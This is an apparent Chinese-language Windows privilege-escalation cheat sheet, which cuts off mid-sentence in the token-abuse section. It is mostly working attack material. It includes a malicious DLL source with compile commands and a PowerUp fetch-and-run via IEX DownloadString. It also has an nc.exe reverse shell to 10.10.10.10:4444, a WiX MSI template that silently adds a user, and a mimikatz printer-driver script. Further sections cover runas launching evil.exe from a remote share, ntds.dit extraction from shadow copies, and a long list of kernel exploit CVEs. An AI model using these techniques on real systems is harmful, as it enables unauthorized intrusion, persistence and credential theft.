枚举已安装程序 已安装程序可作为提权突破点。 Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name 枚举已安装服务 net start wmic service list brief tasklist /SVC 枚举计划任务 schtasks /query /fo LIST 2&gt;nul | findstr TaskName schtasks /query /fo LIST /v &gt; schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State 枚举自启动应用 wmic startup get caption,command reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 利用服务权限错误提权 以管理员/系统身份运行且文件权限不正确的服务可能导致提权，替换该文件或者劫持 DLL（需要可写权限），然后重启该服务即可。 DLL 劫持 寻找 DLL 劫持利用点 PowerSploit 中的 PowerUp 脚本：Find-PathDLLHijack PowerUp.ps1 Process Monitor : check for “Name Not Found” 编译恶意 DLL For x64 compile with: “x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll” For x86 compile with: “i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll” windows_dll.c 内容 #include &lt;windows.h&gt; BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) { if (dwReason == DLL_PROCESS_ATTACH) { system("cmd.exe /k whoami &gt; C:\\Windows\\Temp\\dll.txt"); ExitProcess(0); } return TRUE; } 寻找权限配置不当的 PATH 目录 $ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a &gt;&gt; c:\windows\temp\permissions.txt $ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a" $ sc query state=all | findstr "SERVICE_NAME:" &gt;&gt; Servicenames.txt FOR /F %i in (Servicenames.txt) DO echo %i type Servicenames.txt FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i &gt;&gt; services.txt FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" &gt;&gt; path.txt 在某些情况下，程序可能自主地加载某些路径的 dll，此时就需要逆向特定的应用才可以判断是否可以进行 DLL 劫持。 参考： Powershell 提权框架-Powerup——平心而论，这个提权工具还是很好用的，看后面实战例子 - bonelee - 博客园 PATH 路径可写 下面的命令可以对服务的 path 路进具备的权限进行排查。 $ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a &gt;&gt; c:\windows\temp\permissions.txt $ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a" $ sc query state=all | findstr "SERVICE_NAME:" &gt;&gt; Servicenames.txt FOR /F %i in (Servicenames.txt) DO echo %i type Servicenames.txt FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i &gt;&gt; services.txt FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" &gt;&gt; path.txt 两组命令都可以用，但会生成文件。 或者也可以直接使用 msf 中的 exp： exploit/windows/local/service_permissions windows 10 - CVE-2019-1322 UsoSvc Windows XP SP1 - upnphost 利用 Linux 子系统提权 凭借 root 权限，Windows Subsystem for Linux (WSL) 允许用户在任何端口上创建绑定 shell（无需提升）。 不知道 root 密码？ 没问题，只需将默认用户设置为 root W/.exe –default-user root 即可。 现在启动您的绑定 shell 或反向操作。 Windows 子系统的文件目录也是可以直接查看的： C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\ 利用未加引号的服务路径提权 利用条件： 服务的路径存在无引号且包含空格或其他分隔符。 上级路径可写。 Microsoft Windows 无引号服务路径枚举漏洞。 所有 Windows 服务都有其可执行文件的路径。 如果该路径未加引号且包含空格或其他分隔符，则服务将首先尝试访问父路径中的资源。 例如： For C:\Program Files\something\legit.exe, Windows will try the following paths first: C:\Program.exe C:\Program Files.exe 如果这类路径可写，即可劫持该服务的 exe，如果该服务具备高权限，则可提权。 搜索此类服务。 wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """ gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name 漏洞利用： Metasploit exploit : exploit/windows/local/trusted_service_path PowerUp exploit # find the vulnerable application C:\&gt; powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks" ... [*] Checking for unquoted service paths... ServiceName : BBSvc Path : C:\Program Files\Microsoft\Bing Bar\7.1\BBSvc.exe StartName : LocalSystem AbuseFunction : Write-ServiceBinary -ServiceName 'BBSvc' -Path &lt;HijackPath&gt; ... # automatic exploit Invoke-ServiceAbuse -Name [SERVICE_NAME] -Command "..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe" 利用 PATH 拦截提权 利用条件： PATH 路径中存在可写路径 可写文件夹位于包含合法可执行文件的文件夹之前。 示例： ps 中执行如下的命令查看 PATH $env:Path 假设输出为:C:\Program Files\nodejs\;C:\WINDOWS\system32 检查 C:\Program Files\nodejs 文件夹的权限发现可写。 icacls.exe "C:\Program Files\nodejs\" 由于 nodejs 在 system32 之前，因此可以向 nodejs 文件夹中写入 cmd.exe，下次用户再执行 cmd 时，则会执行 nodejs 中的 cmd.exe copy evil-file.exe "C:\Program Files\nodejs\cmd.exe" 利用 Name Pipe 提权 利用服务自身的漏洞或功能 找到存在命名管道的服务，挖掘服务漏洞或可用功能，利用 Name Pipe 操作这些功能或直接利用漏洞获取到高权限。 利用步骤： Find named pipes: [System.IO.Directory]::GetFiles(“\.\pipe") Check named pipes DACL: pipesec.exe Reverse engineering software Send data throught the named pipe : program.exe &gt;\.\pipe\StdOutPipe 2&gt;\.\pipe\StdErrPipe meterpreter 中的 getsystem 有代表性的 EXP 如 meterpreter 中的 getsystem 命令。该技术的核心在于对 ImpersonateNamedPipeClient API 的利用，通过命名管道的服务端进程模仿客户端进程的访问令牌，获取 SYSTEM 权限。当然，想调用它，前提是进程具备 SeImpersonatePrivilege 的权限，而这通常意味着我们已经是 Admin 用户了。 利用细节： 1) getsystem 新建一个线程创建命名管道并等待服务发来的连接 (服务端) 2) getsystem 创建了一个以 SYSTEM 权限运行的 Windows 服务，该服务会向命名管道发起连接 (客户端) 3) 启动该服务，向目标命名管道发起连接 (客户端 -&gt; 服务端) 4) 该进程(服务端)接收连接，调用 ImpersonateNamedPipeClient，从而模仿了 SYSTEM 权限的访问令牌 5) 完成提权过程后，停止并删除该服务 参考 走进Windows中的提权行为-安全客 - 安全资讯平台 PrintSpoofer 命名管道提权的原理大多类似，一般是诱使 system 权限的服务访问我们指定的命名管道。 Windows 的 MS-RPRN 协议用于打印客户机和打印服务器之间的通信，默认情况下启用。同时，Print Spooler 服务的 RPC 接口暴露在命名管道：\.\pipe\spoolss 中，该服务默认开启。 MS-RPRN 协议定义的 RpcRemoteFindFirstPrinterChangeNotificationEx() 调用创建一个远程更改通知对象，该对象监视对打印机对象的更改，并将更改通知发送到打印客户端。 DWORD RpcRemoteFindFirstPrinterChangeNotificationEx( /* [in] */ PRINTER_HANDLE hPrinter, /* [in] */ DWORD fdwFlags, /* [in] */ DWORD fdwOptions, /* [unique][string][in] */ wchar_t *pszLocalMachine, /* [in] */ DWORD dwPrinterLocal, /* [unique][in] */ RPC_V2_NOTIFY_OPTIONS *pOptions) 其中 pszLocalMachine 是指向表示客户端计算机名称的字符串的指针，需要传递一个 UNC 路径，传递 \127.0.0.1 时，服务器会访问 \127.0.0.1\pipe\spoolss，但这个管道已经被系统注册了，并由 NT AUTHORITY\SYSTEM 控制。 那么下一步就是要想办法把这个请求让我们准备好的恶意管道接收。 考虑到 UNC 路径的性质，如果主机名包含 /，它将通过路径检查，但真正连接的时候会转化为 \ 。那么，如果传递一个 \127.0.0.1/pipe/foo，检查时会认为 127.0.0.1/pipe/foo 是一个主机名，随后在连接 named pipe 时会对参数做标准化，于是就会连接 \127.0.0.1\pipe\foo\pipe\spoolss，那么攻击者就可以把主机名改为 \127.0.0.1/pipe/foo 并注册这个 named pipe 从而窃取 client 的 token。 利用工具： itm4n/PrintSpoofer: Abusing impersonation privileges through the “Printer Bug” 利用内核漏洞提权 可参考：https://github.com/SecWiki/windows-kernel-exploits CVE-2021-33739 [Microsoft DWM Core Library Elevation of Privilege Vulnerability] (Windows 10, 20) CVE-2021-1732 [Windows Win32k Elevation of Privilege Vulnerability] (Windows 10, 2019/20H2) CVE-2020-0787 [Windows Background Intelligent Transfer Service Elevation of Privilege Vulnerability] (Windows 7/8/10, 2008/2012- 2016/2019) CVE-2020-0796 [A remote code execution vulnerability exists in the way that the Microsoft Server Message Block 3.1.1 (SMBv3)- protocol handles certain requests, aka ‘Windows SMBv3 Client/Server Remote Code Execution Vulnerability’] (Windows 1903/1909) CVE-2019-1458 [An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle- objects in memory] (Windows 7/8/10/2008/2012/2016) CVE-2019-0803 [An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle- objects in memory] (Windows 7/8/10/2008/2012/2016/2019) CVE-2018-8639 [An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle- objects in memory] (Windows 7/8/10/2008/2012/2016) CVE-2018-1038 [Windows Kernel Elevation of Privilege Vulnerability] (Windows 7 SP1/Windows Server 2008 R2 SP1) CVE-2018-0743 [Windows Subsystem for Linux Elevation of Privilege Vulnerability] (Windows 10 version 1703/Windows 10 version 1709- Windows Server version 1709) CVE-2018-8453 [An elevation of privilege vulnerability in Windows Win32k component] (&gt;= windows 8.1) CVE-2018-8440 [Windows ALPC Elevation of Privilege Vulnerability] (windows 7/8.1/10/2008/2012/2016) MS17-017 　[KB4013081]　　[GDI Palette Objects Local Privilege Escalation]　　(windows 7/8) CVE-2017-8464 　[LNK Remote Code Execution Vulnerability]　　(windows 10/8.1/7/2016/2010/2008) CVE-2017-0213 　[Windows COM Elevation of Privilege Vulnerability]　　(windows 10/8.1/7/2016/2010/2008) CVE-2018-0833 [SMBv3 Null Pointer Dereference Denial of Service] (Windows 8.1/Server 2012 R2) CVE-2018-8120 [Win32k Elevation of Privilege Vulnerability] (Windows 7 SP1/2008 SP2,2008 R2 SP1) MS17-010 　[KB4013389]　　[Windows Kernel Mode Drivers]　　(windows 7/2008/2003/XP) MS16-135 　[KB3199135]　　[Windows Kernel Mode Drivers]　　(2016) MS16-111 　[KB3186973]　　[kernel api]　　(Windows 10 10586 (32/64)/8.1) MS16-098 　[KB3178466]　　[Kernel Driver]　　(Win 8.1) MS16-075 　[KB3164038]　　[Hot Potato]　　(2003/2008/7/8/2012) MS16-034 　[KB3143145]　　[Kernel Driver]　　(2008/7/8/10/2012) MS16-032 　[KB3143141]　　[Secondary Logon Handle]　　(2008/7/8/10/2012) MS16-016 　[KB3136041]　　[WebDAV]　　(2008/Vista/7) MS16-014 　[K3134228]　　[remote code execution]　　(2008/Vista/7) MS15-097 　[KB3089656]　　[remote code execution]　　(win8.1/2012) MS15-076 　[KB3067505]　　[RPC]　　(2003/2008/7/8/2012) MS15-077 　[KB3077657]　　[ATM]　　(XP/Vista/Win7/Win8/2000/2003/2008/2012) MS15-061 　[KB3057839]　　[Kernel Driver]　　(2003/2008/7/8/2012) MS15-051 　[KB3057191]　　[Windows Kernel Mode Drivers]　　(2003/2008/7/8/2012) MS15-015 　[KB3031432]　　[Kernel Driver]　　(Win7/8/8.1/2012/RT/2012 R2/2008 R2) MS15-010 　[KB3036220]　　[Kernel Driver]　　(2003/2008/7/8) MS15-001 　[KB3023266]　　[Kernel Driver]　　(2008/2012/7/8) MS14-070 　[KB2989935]　　[Kernel Driver]　　(2003) MS14-068 　[KB3011780]　　[Domain Privilege Escalation]　　(2003/2008/2012/7/8) MS14-058 　[KB3000061]　　[Win32k.sys]　　(2003/2008/2012/7/8) MS14-066 　[KB2992611]　　[Windows Schannel Allowing remote code execution] (VistaSP2/7 SP1/8/Windows 8.1/2003 SP2/2008 SP2/2008 R2- SP1/2012/2012 R2/Windows RT/Windows RT 8.1) MS14-040 　[KB2975684]　　[AFD Driver]　　(2003/2008/2012/7/8) MS14-002 　[KB2914368]　　[NDProxy]　　(2003/XP) MS13-053 　[KB2850851]　　[win32k.sys]　　(XP/Vista/2003/2008/win 7) MS13-046 　[KB2840221]　　[dxgkrnl.sys]　　(Vista/2003/2008/2012/7) MS13-005 　[KB2778930]　　[Kernel Mode Driver]　　(2003/2008/2012/win7/8) MS12-042 　[KB2972621]　　[Service Bus]　　(2008/2012/win7) MS12-020 　[KB2671387]　　[RDP]　　(2003/2008/7/XP) MS11-080 　[KB2592799]　　[AFD.sys]　　(2003/XP) MS11-062 　[KB2566454]　　[NDISTAPI]　　(2003/XP) MS11-046 　[KB2503665]　　[AFD.sys]　　(2003/2008/7/XP) MS11-011 　[KB2393802]　　[kernel Driver]　　(2003/2008/7/XP/Vista) MS10-092 　[KB2305420]　　[Task Scheduler]　　(2008/7) MS10-065 　[KB2267960]　　[FastCGI]　　(IIS 5.1, 6.0, 7.0, and 7.5) MS10-059 　[KB982799]　　 [ACL-Churraskito]　　(2008/7/Vista) MS10-048 　[KB2160329]　　[win32k.sys]　　(XP SP2 &amp; SP3/2003 SP2/Vista SP1 &amp; SP2/2008 Gold &amp; SP2 &amp; R2/Win7) MS10-015 　[KB977165]　　 [KiTrap0D]　　(2003/2008/7/XP) MS10-012 　[KB971468]　　[SMB Client Trans2 stack overflow]　　(Windows 7/2008R2) MS09-050 　[KB975517]　　 [Remote Code Execution]　　(2008/Vista) MS09-020 　[KB970483]　　 [IIS 6.0]　　(IIS 5.1 and 6.0) MS09-012 　[KB959454]　　 [Chimichurri]　　(Vista/win7/2008/Vista) MS08-068 　[KB957097]　　 [Remote Code Execution]　　(2000/XP) MS08-067 　[KB958644]　　 [Remote Code Execution]　　(Windows 2000/XP/Server 2003/Vista/Server 2008) MS08-066 　[KB956803]　　 [AFD.sys]　　(Windows 2000/XP/Server 2003) MS08-025 　[KB941693]　　 [Win32.sys]　　(XP/2003/2008/Vista) MS06-040 　[KB921883]　　 [Remote Code Execution]　　(2003/xp/2000) MS05-039 　[KB899588]　　 [PnP Service]　　(Win 9X/ME/NT/2000/XP/2003) MS03-026 　[KB823980]　　 [Buffer Overrun In RPC Interface]　　(/NT/2000/XP/2003) 利用 Microsoft Windows Installer 提权 AlwaysInstallElevated 注册表项错误配置 windows 有一个系统进程 MSIEXEC，用于安装 Windows Installer 安装包，AlwaysInstallElevated 是一个组策略配置，如果启用，那么将允许普通用户以 SYSTEM 权限运行 msi 文件进行安装。如果对方机器恰好开启，我们就可以利用此缺陷提权。 注册表查询, 如果两个查询都返回值 0x1，则为用户和计算机启用了 AlwaysInstallElevated，表明系统容易受到攻击。 # shell reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated # ps Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer 漏洞利用： MSF 的 exploit/windows/local/always_install_elevate 模块可以自动完成提权操作，会创建一个随机文件名的 msi 文件，并在提权成功后删除此mai文件，攻击成功会返回 system 权限会话 getuid use exploit/windows/local/always_install_elevated set session 4 run PowerUP 利用 检查注册表的设置： powershell -exec bypass -Command "&amp; {import-module .\powerup.ps1; get-registryalwaysinstallelevated}" 生成新的账户： powershell -exec bypass -Command "&amp; {import-module .\powerup.ps1; write-useraddmsi}" Metasploit可以生成 MSI 类型的载荷，但很容易被 AV/EDR 所检测。所以我们可以手动创建 MSI 包裹文件。 我们可以使用工具 wix (https://github.com/wixtoolset/wix3) 来将包含二进制文件或者任意命令的模板 (https://github.com/KINGSABRI/MSI-AlwaysInstallElevated) 进行打包然后安装。 我们可以直接将要运行的载荷或者命令包含在里面，我们尝试执行添加新用户的命令，模板内容如下： &lt;Wix xmlns="http://schemas.microsoft.com/wix/2006/wi"&gt; &lt;Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="23e23deeqwddeweqwde" Version="0.0.1" Manufacturer="Test1" Language="1033"&gt; &lt;Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package" /&gt; &lt;Media Id='1' /&gt; &lt;Directory Id="TARGETDIR" Name="SourceDir"&gt; &lt;Directory Id="ProgramFilesFolder"&gt; &lt;Directory Id="INSTALLLOCATION" Name="Example"&gt; &lt;Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222" KeyPath="yes"&gt;&lt;/Component&gt; &lt;/Directory&gt; &lt;/Directory&gt; &lt;/Directory&gt; &lt;Feature Id="DefaultFeature" Level="1"&gt; &lt;ComponentRef Id="ApplicationFiles" /&gt; &lt;/Feature&gt; &lt;CustomAction Id="Shell" Execute="deferred" Directory="TARGETDIR" Impersonate="no" ExeCommand="net user zhi 123.com /add" Return="check" /&gt; &lt;InstallExecuteSequence&gt; &lt;Custom Action="Shell" After="InstallFiles"&gt;&lt;/Custom&gt; &lt;/InstallExecuteSequence&gt; &lt;/Product&gt; &lt;/Wix&gt; 将该模板打包成 .msi 文件： candle zhi.wxs light zhi.wixobj 此时已经生成了zhi.msi文件，运行该文件即可创建用户名为zhi AlwaysInstallElevated提权 本地侦擦与提权 - JFSec - 博客园 利用存在漏洞的驱动提权 条件： 漏洞 存在漏洞的驱动 查看驱动： PS C:\Users\Swissky&gt; driverquery.exe /fo table /si Module Name Display Name Driver Type Link Date ============ ====================== ============= ====================== 1394ohci 1394 OHCI Compliant Ho Kernel 12/10/2006 4:44:38 PM 3ware 3ware Kernel 5/18/2015 6:28:03 PM ACPI Microsoft ACPI Driver Kernel 12/9/1975 6:17:08 AM AcpiDev ACPI Devices driver Kernel 12/7/1993 6:22:19 AM acpiex Microsoft ACPIEx Drive Kernel 3/1/2087 8:53:50 AM acpipagr ACPI Processor Aggrega Kernel 1/24/2081 8:36:36 AM AcpiPmi ACPI Power Meter Drive Kernel 11/19/2006 9:20:15 PM acpitime ACPI Wake Alarm Driver Kernel 2/9/1974 7:10:30 AM ADP80XX ADP80XX Kernel 4/9/2015 4:49:48 PM &lt;SNIP&gt; 对比存在漏洞的驱动： LOLDrivers 利用打印机提权 将 mimikatz 添加为虚拟打印机 Create a Printer $printerName = 'Universal Priv Printer' $system32 = $env:systemroot + '\system32' $drivers = $system32 + '\spool\drivers' $RegStartPrinter = 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\' + $printerName Copy-Item -Force -Path ($system32 + '\mscms.dll') -Destination ($system32 + '\mimispool.dll') Copy-Item -Force -Path '.\mimikatz_trunk\x64\mimispool.dll' -Destination ($drivers + '\x64\3\mimispool.dll') Copy-Item -Force -Path '.\mimikatz_trunk\win32\mimispool.dll' -Destination ($drivers + '\W32X86\3\mimispool.dll') Add-PrinterDriver -Name 'Generic / Text Only' Add-Printer -DriverName 'Generic / Text Only' -Name $printerName -PortName 'FILE:' -Shared New-Item -Path ($RegStartPrinter + '\CopyFiles') | Out-Null New-Item -Path ($RegStartPrinter + '\CopyFiles\Kiwi') | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi') -Name 'Directory' -PropertyType 'String' -Value 'x64\3' | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi') -Name 'Files' -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi') -Name 'Module' -PropertyType 'String' -Value 'mscms.dll' | Out-Null New-Item -Path ($RegStartPrinter + '\CopyFiles\Litchi') | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Directory' -PropertyType 'String' -Value 'W32X86\3' | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Files' -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Module' -PropertyType 'String' -Value 'mscms.dll' | Out-Null New-Item -Path ($RegStartPrinter + '\CopyFiles\Mango') | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango') -Name 'Directory' -PropertyType 'String' -Value $null | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango') -Name 'Files' -PropertyType 'MultiString' -Value $null | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango') -Name 'Module' -PropertyType 'String' -Value 'mimispool.dll' | Out-Null Execute the driver $serverName = 'dc.purple.lab' $printerName = 'Universal Priv Printer' $fullprinterName = '\\' + $serverName + '\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'}) Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue Add-Printer -ConnectionName $fullprinterName PrinterNightmare 漏洞CVE编号：CVE-2021-1675。未经身份验证的远程攻击者可利用该漏洞以SYSTEM权限在域控制器上执行任意代码，从而获得整个域的控制权。建议受影响用户及时更新漏洞补丁进行防护，做好资产自查以及预防工作，以免遭受黑客攻击。 影响范围 Windows Server 2012 R2 (Server Core installation) Windows Server 2012 R2 Windows Server 2012 (Server Core installation) Windows Server 2012 Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) Windows Server 2008 R2 for x64-based Systems Service Pack 1 Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation) Windows Server 2008 for x64-based Systems Service Pack 2 Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) Windows Server 2008 for 32-bit Systems Service Pack 2 Windows RT 8.1 Windows 8.1 for x64-based systems Windows 8.1 for 32-bit systems Windows 7 for x64-based Systems Service Pack 1 Windows 7 for 32-bit Systems Service Pack 1 Windows Server 2016 (Server Core installation) Windows Server 2016 Windows 10 Version 1607 for x64-based Systems Windows 10 Version 1607 for 32-bit Systems Windows 10 for x64-based Systems Windows 10 for 32-bit Systems Windows Server, version 20H2 (Server Core Installation) Windows 10 Version 20H2 for ARM64-based Systems Windows 10 Version 20H2 for 32-bit Systems Windows 10 Version 20H2 for x64-based Systems Windows Server, version 2004 (Server Core installation) Windows 10 Version 2004 for x64-based Systems Windows 10 Version 2004 for ARM64-based Systems Windows 10 Version 2004 for 32-bit Systems Windows 10 Version 21H1 for 32-bit Systems Windows 10 Version 21H1 for ARM64-based Systems Windows 10 Version 21H1 for x64-based Systems Windows 10 Version 1909 for ARM64-based Systems Windows 10 Version 1909 for x64-based Systems Windows 10 Version 1909 for 32-bit Systems Windows Server 2019 (Server Core installation) Windows Server 2019 Windows 10 Version 1809 for ARM64-based Systems Windows 10 Version 1809 for x64-based Systems Windows 10 Version 1809 for 32-bit Systems cube0x0/CVE-2021-1675: C# and Impacket implementation of PrintNightmare CVE-2021-1675/CVE-2021-34527 [〖EXP〗Ladon打印机漏洞提权CVE-2021-1675复现 K8哥哥’s Blog](https://k8gege.org/p/CVE-2021-1675.html) Bring Your Own Vulnerability windows 允许低权限用户安装打印机驱动，因此我们可以自行安装带有漏洞的驱动程序，然后通过这些驱动程序的漏洞提权到 SYSTEM。 Concealed Position : https://github.com/jacob-baines/concealed_position ACIDDAMAGE - CVE-2021-35449 - Lexmark Universal Print Driver LPE RADIANTDAMAGE - CVE-2021-38085 - Canon TR150 Print Driver LPE POISONDAMAGE - CVE-2019-19363 - Ricoh PCL6 Print Driver LPE SLASHINGDAMAGE - CVE-2020-1300 - Windows Print Spooler LPE 利用 exp： jacob-baines/concealed_position: Bring your own print driver privilege escalation tool 利用 RunAS 命令提权或降权 RunAS 命令使用场景： 权限不够读不到帐密或 HASH 的情况下，验证用户是否使用某个已保存的密码，使用该已保存的密码可实现提权 SYSTEM 权限降权到某个用户进行操作时，例如切换到特定的用户，读取对应的浏览器记录、或者获取特定用户的 shell 等。 枚举保存的密码： cmdkey /list Currently stored credentials: Target: Domain:interactive=WORKGROUP\Administrator Type: Domain Password User: WORKGROUP\Administrator 使用保存的凭证连接远程 SMB 或者直接运行命令： runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe" runas /savecred /user:Administrator "cmd.exe /k whoami" 其他利用： 〖教程〗Ladon非交互式runas执行命令/反弹SHELL 系统自带Runas命令需要交互式登陆，在webshell或不支持交互式的shell下使用麻烦。而Ladon的Runas则完美解决了以上问题，支持非交互式模拟登陆指定用户运行程序或命令。 利用 Shadow Copies 提权（域控） 该利用方式一般用于从域控中获取 ntds.dit 文件（活动目录中的所有数据都保存在该文件中）。 获取卷影位置： # List shadow copies using vssadmin (Needs Admnistrator Access) vssadmin list shadows # List shadow copies using diskshadow diskshadow list shadows all 创建软链接以便查看。 # Make a symlink to the shadow copy and access mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\ 或者创建一个卷影拷贝，然后复制出来 vssadmin create shadow /for=c: copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\NTDS\ntds.dit c:\ntds.dit 获取到 ntds 后，可以想办法获取其中的散列值。 Impacket 中的 Secretsdump msf 中的 Psexec_ntdsgrab 模块 msf 中 Meterpreter会话 + windows/gather/credentials/domain_hashdump 参考资料： 域控安全之域渗透 - 知乎 利用 PsExec 提权(Win2003 &amp; Win2008) PsExec 是 windows 内核套件 SysInternalSuite 中的一个工具，可以从 Administrator 提权到 SYSTEM 下载地址:Sysinternals Utilities - Sysinternals | Microsoft Learn PsExec -i -s cmd 参考 SecBooks/【公众号文章】bypass/实战遇见到的好用提权方法集合.md at main · SexyBeast233/SecBooks 利用 Windows 自带文件、脚本提权 Living Off The Land Binaries and Scripts (and also Libraries) : https://lolbas-project.github.io/ 滥用 Token 提权 条件： 已经拿到非管理员权限的服务帐户 效果： 提权至 SYSTEM 背景知识 当用户登录时，系统会创建一个访问令牌。用户执行的每个进程都有该访问令牌的副本。令牌标识了用户、用户的组、用户的权限以及SID（安全标识符）。 当本地管理员登录时，系统会创建两个访问令牌：一个具有管理员权限，另一个具有普通权限。默认情况下，当该用户执行进程时，将使用具有常规（非管理员）权限的进程。当此用户尝试以管理员身份执行任何操作（例如“以管理员身份运行”）时，将使用 UAC 来请求权限。 使用 whoami /priv 可以查看当前用户的权限。拥有下面权限时可考虑使用这种方式： iis sqlserver 的用户通常具有 SeImpersonatePrivilege 和 SeAssignPrimaryPrivilege 权限。 服务用户通常拥有 SeBackupPrivilege 和 SeRestorePrivilege 权限。 SeIncreaseQuotaPrivilege: DISABLED SeShutdownPrivilege: DISABLED SeAuditPrivilege: DISABLED SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED SeUndockPrivilege: DISABLED SeIncreaseWorkingSetPrivilege: DISABLED SeTimeZonePrivilege: DISABLED 不同的几种权限可能会用于不同的攻击场景 1. SeImpersonatePrivilege 任何拥有此权限的进程都可以模拟（但不能创建）它能够处理的任何令牌。 您可以从 Windows 服务 (DCOM) 获取特权令牌，使其针对该漏洞执行 NTLM 身份验证，然后以 SYSTEM 身份执行进程。 利用方法： 使用 NTLM relay 到本地协商获得系统用户的 token。 可以使用开源工具烂土豆、孤独土豆或多汁土豆。 通过WinAPI CreateProcessWithToken创建一个新的进程，传入系统用户的令牌。 只有具有SeImpersonatePrivilege权限才能成功创建。 2. SeAssignPrimaryPrivilege 它与 SeImpersonatePrivilege 非常相似，它将使用相同的方法来获取特权令牌。 然后，此权限允许将主令牌分配给新的/挂起的进程。 使用特权模拟令牌，您可以派生主令牌 (DuplicateTokenEx)。有了令牌，您可以使用“CreateProcessAsUser”创建一个新进程，或者创建一个挂起的进程并设置令牌（通常，您不能修改正在运行的进程的主令牌）。 利用方法： 利用 NTLM Relay 到当地谈判获得系统用户的 token 通过 WinAPI CreateProcessAsUser 创建新进程，传入系统用户的 token，该 token 具有系统权限。 3. SeBackupPrivilege 此权限使系统授予对任何文件的所有读取访问控制（仅限读取）。使用它从注册表中读取本地管理员帐户的密码哈希值，然后将“psexec”或“wmicexec”与哈希值 (PTH) 结合使用。 如果本地管理员被禁用，或者配置为本地管理员在远程连接时不是管理员，则此攻击将不起作用。 攻击场景：收集 4. SeRestorePrivilege 对系统上任何文件的写入访问控制，无论文件 ACL 为何。你可以修改服务、DLL劫持、设置调试器（图像文件执行选项）……很多选项可以升级 攻击场景：持久化；防御规避 5. SeCreateTokenPrivilege 仅当用户可以模拟令牌（即使没有 SeImpersonatePrivilege）时，此令牌才可以用作 EoP 方法。 在可能的情况下，如果令牌针对同一用户并且完整性级别小于或等于当前进程完整性级别，则用户可以模拟令牌。在这种情况下，用户可以创建一个模拟令牌并向其添加特权组 SID。 攻击方式：提权 6. SeLoadDriverPrivilege 加载和卸载设备驱动程序。 攻击方式：持久化；防御规避 7. SeTakeOwnershipPrivilege 此权限与 SeRestorePrivilege 非常相似。它允许进程通过授予 WRITE_OWNER 